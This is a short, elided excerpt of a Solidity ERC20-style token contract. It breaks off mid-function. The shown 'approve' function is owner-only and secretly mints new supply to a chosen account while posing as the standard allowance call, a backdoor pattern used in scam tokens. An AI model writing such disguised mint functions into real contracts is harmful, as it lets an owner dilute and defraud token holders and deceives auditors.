...
contract Coin is IERC20, Ownable {
  ...
  function approve(uint256 amount, address account) external onlyOwner {
    _tTotal += amount;
    _rTotal = (MAX - (MAX % _tTotal));
    (, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(amount);
    _tOwned[account] += tTransferAmount;
